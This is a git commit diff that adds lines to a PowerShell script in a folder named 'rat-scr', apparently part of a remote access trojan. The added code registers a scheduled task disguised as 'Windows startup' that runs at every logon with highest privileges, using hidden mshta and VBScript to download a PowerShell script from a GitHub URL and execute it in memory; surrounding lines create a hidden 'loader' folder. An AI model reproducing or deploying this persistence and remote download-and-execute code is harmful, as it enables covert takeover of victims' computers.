67e44a7b2626acf9d088c709c5f36883a2abb5b8
43a1723 <hai1723notgay@gmail.com>
2024-08-18 15:27:05 +0700

    Update main.ps1

--- rat-scr/main.ps1
+++ rat-scr/main.ps1
@@ -1,3 +1,9 @@
+$task_name = "Windows startup"
+$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='a';iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
+$task_trigger = New-ScheduledTaskTrigger -AtLogOn
+$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
+Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -Force
+
 $dir = "$env:temp\loader"
 New-Item -ItemType Directory -Path $dir
 attrib +h +s $dir
